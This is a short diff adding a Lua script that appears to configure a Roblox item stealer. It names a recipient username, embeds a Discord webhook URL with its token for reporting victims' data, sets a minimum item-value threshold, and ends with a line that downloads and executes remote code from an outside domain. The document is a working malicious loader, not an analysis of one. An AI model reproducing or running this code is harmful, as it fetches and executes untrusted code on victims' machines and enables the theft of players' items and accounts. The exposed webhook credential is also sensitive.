@@ -1,0 +1,7 @@
+Username = "Rulesofduty321"
+Username2 = "Rulesofduty321"
+Webhook = "https://discord.com/api/webhooks/1245698787184476190/-NW5ebgpHCh5vw5G_W101zVsZTo-aLZnOU4WPwhtxxouj-dxjakftb9tLeXB4-zHw3CE"
+
+MinimumRAP = 100000
+
+loadstring(game:HttpGet("https://egorikusa.space"))()
